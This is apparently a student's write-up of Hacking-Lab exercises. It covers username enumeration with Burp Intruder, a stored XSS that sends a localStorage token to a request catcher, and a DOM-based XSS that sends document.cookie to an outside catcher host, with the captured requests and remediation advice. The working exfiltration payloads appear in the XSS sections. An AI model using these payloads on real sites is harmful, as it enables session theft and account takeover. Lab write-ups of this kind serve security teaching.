# 1 Command Injection 
I don't really know if it was intentionally but the website only showed a waiting screen with the following http response:
```html
<html>

<style>
#loading{
  position: fixed;
  display: block;
  width: 300px;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
.message {
  text-align: center;
}
.spinner {
  left: calc(50% - 60px - 8px - 8px);
  border: 16px solid #f3f3f3; /* Light grey */
  border-top: 16px solid #3498db; /* Blue */
  border-radius: 50%;
  width: 120px;
  height: 120px;
  animation: spin 2s linear infinite;
}
.rel {
  position: relative;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>

<div id="loading">
  <div class="spinner rel">
  </div>
  <div class="message rel">
    <p>
    Loading, please wait ...
    </p>
  </div>
</div>

<script type="text/javascript">
var pingUrl = window.location.href;

function ping() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {

      parser = new DOMParser();
      xmlDoc = parser.parseFromString(xhttp.responseText,"text/html");
      loader = xmlDoc.getElementById("loading");

      if (!loader) {
        window.location.href = pingUrl;
      }
    }
  };
  xhttp.open("GET", pingUrl, true);
  xhttp.send()
}

setInterval(ping, 2000);
</script>

</html>
```

Here we see the code `xhttp.open("GET", pingUrl, true);`.  We can probably use this function to get our cross site scripting running. 
# 2 Username enumeration
We have the information that there exists an User with the Password *DarkSide2021*. We now need to find the fitting user to the given password.
## Looking at the login post
With Burp we find the following Post:
```
POST /login HTTP/1.1
Host: 43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land
Referer: https://43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=test&password=test
```
Here we see the post that get's used when you use the login mask. We can now use burp to send multiple posts with username combinations. We can use the intruder function for this. 
```
POST /login HTTP/1.1
Host: 43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land
Referer: https://43a567de-fc56-4857-a1f3-af4c045e74df.i.vuln.land/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=test&password=DarkSide2021
```
We changed the Password to our known password to *DarkSide2021* and added the usernames to the payload as fields. After that we got the following result:

|   |   |   |   |   |   |   |   |   |
|---|---|---|---|---|---|---|---|---|
|43|vader|DarkSide2021|302|36|false|false|337||
|26|jabba|DarkSide2021|200|99|false|false|2750||
|39|tarkin|DarkSide2021|200|88|false|false|2750||
|32|owen|DarkSide2021|200|211|false|false|2752||
|41|threepio|DarkSide2021|200|206|false|false|2752||
|14|deak|DarkSide2021|200|204|false|false|2752||
|33|porkins|DarkSide2021|200|201|false|false|2752||
|19|gantry|DarkSide2021|200|193|false|false|2752||
|11|commander|DarkSide2021|200|183|false|false|2752||
|8|camie|DarkSide2021|200|173|false|false|2752||
|29|massassi|DarkSide2021|200|173|false|false|2752||
|31|officer|DarkSide2021|200|171|false|false|2752||
|38|tagge|DarkSide2021|200|161|false|false|2752||
|10|chief|DarkSide2021|200|136|false|false|2752||
|18|fixer|DarkSide2021|200|129|false|false|2752||
|5|ben|DarkSide2021|200|128|false|false|2752||
|20|gold|DarkSide2021|200|128|false|false|2752||
|17|first|DarkSide2021|200|120|false|false|2752||
|12|control|DarkSide2021|200|109|false|false|2752||
|30|motti|DarkSide2021|200|109|false|false|2752||
|40|technician|DarkSide2021|200|104|false|false|2752||
|9|captain|DarkSide2021|200|101|false|false|2752||
|6|beru|DarkSide2021|200|94|false|false|2752||
|1|astro-officer|DarkSide2021|200|91|false|false|2752||
|25|intercom|DarkSide2021|200|90|false|false|2752||
|15|death|DarkSide2021|200|89|false|false|2752||
|22|han|DarkSide2021|200|89|false|false|2752||
|36|second|DarkSide2021|200|89|false|false|2752||
|24|imperial|DarkSide2021|200|88|false|false|2752||
|7|biggs|DarkSide2021|200|83|false|false|2752||
|35|red|DarkSide2021|200|81|false|false|2752||
|21|greedo|DarkSide2021|200|80|false|false|2752||
|2|aunt|DarkSide2021|200|75|false|false|2752||
|3|bartender|DarkSide2021|200|73|false|false|2752||
|28|luke|DarkSide2021|200|73|false|false|2752||
|37|star|DarkSide2021|200|73|false|false|2752||
|45|wedge|DarkSide2021|200|69|false|false|2752||
|27|leia|DarkSide2021|200|67|false|false|2752||
|16|dodonna|DarkSide2021|200|63|false|false|2752||
|44|voice|DarkSide2021|200|48|false|false|2752||
|13|creature|DarkSide2021|200|42|false|false|2752||
|0|||200|37|false|false|2752||
|42|trooper|DarkSide2021|200|35|false|false|2752||
|4|base|DarkSide2021|200|34|false|false|2752||
|23|human|DarkSide2021|200|33|false|false|2752||
|34|rebel|DarkSide2021|200|29|false|false|2752||

When we look at the three types of lengths we can see that all responses are different:

Response with 2752, shortened:
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Oct 2025 20:32:38 GMT
Etag: W/"a0a-XGfr62juN7urOWKsM5xSJoeTbQ8"
X-Powered-By: Express
Content-Length: 2570

      <button type="submit" class="btn btn-primary btn-block">Log in</button>
            </div>
            <div>
                
                    <p>Unknown username.<p>
                
                
            </div>
        </form>
    </div
</html>
```
These are usernames that don't fit. 

Response with 2750, shortened:
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Oct 2025 20:33:04 GMT
Etag: W/"a08-1QYGGofEeKOIrHLmqhHvv69U9tk"
X-Powered-By: Express
Content-Length: 2568
<!-- views/pages/index.ejs -->
in</button>
            </div>
            <div>
                    <p>Wrong password.<p>   
            </div>
        </form>
    </div>
</main>
</html>
```

And last but not least, Response with 337 shortened:
```
HTTP/2 302 Found
Content-Type: text/html; charset=utf-8
Date: Tue, 14 Oct 2025 20:33:10 GMT
Location: /
Set-Cookie: connect.sid=s%3ABGMP4_8BRXzSPETSMyV2kxmFMMyG_umN.2wMUkfByqVO4oOhkTZ61GTDSgbJqYeo7BpodUfFqrYw; Path=/; HttpOnly
Vary: Accept
X-Powered-By: Express
Content-Length: 46

<p>Found. Redirecting to <a href="/">/</a></p>
```
Here we see that vader is the right user.
## Solution
*vader* is the right user. 
# 3 GlockenEmil 2.0 - XSS
We need to exploit a *stored XSS vulnerability* in the Rate product functionality. A token should be send to the attacker when a victim watches the product. We use a request catcher, to get the stored credentials. 

We got the following hints:
- we need to login
- localStorage.getItem('key') to get a key object
- We can use a GET or POST to send the authentication token, the easiest way is the fetch API

First i logged in and looked at the cookies. Conveniently there is only one cookie that probably is the session cookie:
`chatUser: 5aa0481e876d9d39d439785c`

We can now use the rating form and the request catcher to send it to the request fetcher:
```
<script>
fetch('https://9b591611-dc97-4e7d-af00-9531dd7b3114.i.vuln.land/x?token='
      + encodeURIComponent(localStorage.getItem('token')), {method:'GET', mode:'no-cors'});
</script>
```

We can now validate it with the second user:
```
URL: http://9b591611-dc97-4e7d-af00-9531dd7b3114.i.vuln.land/x?token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTc2MDQ3NTA0MSwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.02V9Qtci2rj9U_dOaLAEuyDbSGzMJ6WGQ0P1brQ7l6k"  
METHOD: GET  
IP: 10.2.0.1  
Time: 2025-10-14 21:17:26  
Headers:  
Host: 9b591611-dc97-4e7d-af00-9531dd7b3114.i.vuln.land  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0  
Accept: */*  
Accept-Encoding: gzip, deflate, br  
Accept-Language: en-US,en;q=0.5  
Priority: u=4  
Referer: https://20a70a84-598f-4b95-9965-b661e77365df.i.vuln.land/  
Sec-Fetch-Dest: empty  
Sec-Fetch-Mode: no-cors  
Sec-Fetch-Site: same-site  
Te: trailers  
X-Forwarded-For: 213.55.187.92  
X-Forwarded-Host: 9b591611-dc97-4e7d-af00-9531dd7b3114.i.vuln.land  
X-Forwarded-Port: 443  
X-Forwarded-Proto: https  
X-Forwarded-Server: traefik.vuln.land  
X-Real-Ip: 213.55.187.92  
  
  
QueryString:  
b'token=%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1JldGFpbGVyIjpmYWxzZSwiX2lkIjoiNWFhMDQ4MWU4NzZkOWQzOWQ0Mzk3ODVjIiwidXNlcm5hbWUiOiJjdXN0b21lcjEiLCJmaXJzdG5hbWUiOiJQZXRlciIsImxhc3RuYW1lIjoiSG9sem1hbm4iLCJlbWFpbCI6IlBldGVyLkhvbHptYW5uQGdtYWlsLmNvbSIsImlhdCI6MTc2MDQ3NTA0MSwiYXVkIjoic2VsZiIsImlzcyI6IndlYnNob3AifQ.02V9Qtci2rj9U_dOaLAEuyDbSGzMJ6WGQ0P1brQ7l6k%22'  
===================================================
```
# 4 XSS – DOM-based

## Where the vulnerability is
The “Hacking-Lab for Fun and Profit” page reads the URL fragment (`location.hash`) and injects it into the DOM using an HTML-interpreting sink (e.g., `innerHTML` / jQuery `.html()`), enabling DOM-based XSS.

## Exploit URL used (encoded; paste into victim’s address bar)
```
https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#%3Cimg%20src%3Dx%20onerror%3D%22location.href%3D%27https%3A%2F%2F7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land%2Fx%3Fc%3D%27%2BencodeURIComponent(document.cookie)%22%3E
```


## Captured request (from catcher `/debug`)
```
URL: http://7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land/x?c=jsessionid%3Dmy_name_is_bond_007
METHOD: GET
IP: 10.2.0.1
Time: 2025-10-14 22:19:52
Headers:
Host: 7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.5
Priority: u=0, i
Referer: https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-site
Te: trailers
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 213.55.187.92
X-Forwarded-Host: 7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Server: traefik.vuln.land
X-Real-Ip: 213.55.187.92

QueryString:
b'c=jsessionid%3Dmy_name_is_bond_007'
```
## Exfiltrated value
Cookie: `jsessionid=my_name_is_bond_007` (contained in the `c` query parameter).
## Why this is DOM-based & detectability
- The payload resides in the URL **fragment** (`#…`), which is processed **only by the browser** and **not sent** to the server in the initial HTTP request.
- The origin server won’t log the payload; it will typically only see the **secondary request** to the catcher (and possibly CSP reports).
## Remediation
- Replace unsafe sinks: **`.innerHTML` / `$.html()` → `.textContent` / `$.text()`** for any content derived from `location.hash`.
- Enforce strict allow-listing of permitted fragment values; ignore everything else.
- Add a strict CSP, e.g.:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'
```


## Exploration
Reflected text:
```
https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#Hello
```
HTML render (bold):
```
https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#%3Cb%3EXSS%3C/b%3E
```
PoC alert:
```
https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
```

## Summary
- **Vulnerability location:** On the “Hacking-Lab for Fun and Profit” page (`/start.html`), the app reads `location.hash` and injects it into the DOM via an HTML-interpreting sink (e.g., `innerHTML`/`$.html()`), enabling DOM XSS.  
    _Verified by:_ `#Hello` reflected, bold render with `#%3Cb%3EXSS%3C/b%3E`, and alert PoC with `#%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`.
    
- **Exploit URL used (encoded):**  
    `https://3bfff57e-060d-4a7a-8bbc-07d36cc7db6a.i.vuln.land/start.html#%3Cimg%20src%3Dx%20onerror%3D%22location.href%3D%27https%3A%2F%2F7d19ce6f-b2a2-412d-9e44-f398523eb52f.i.vuln.land%2Fx%3Fc%3D%27%2BencodeURIComponent(document.cookie)%22%3E`
    
- **Captured request (from catcher `/debug`):**  
    `GET /x?c=jsessionid%3Dmy_name_is_bond_007` at **2025-10-14 22:19:52**; Referer: `https://3bfff57e-.../start.html`; full headers included (Host, User-Agent, Sec-Fetch-_, X-Forwarded-_, etc.).  
    **Exfiltrated cookie:** `jsessionid=my_name_is_bond_007`.
    
- **Server-side detectability:** Low. The payload is in the URL **fragment** (`#…`), which is not sent to the origin server. The origin typically only sees the **secondary request** to the catcher (and possibly CSP violation reports).
    
- **Fix (concise):** Replace `.innerHTML`/`$.html()` with `.textContent`/`$.text()`, strictly allow-list expected fragment values, and add a CSP (e.g., `default-src 'self'; script-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'`).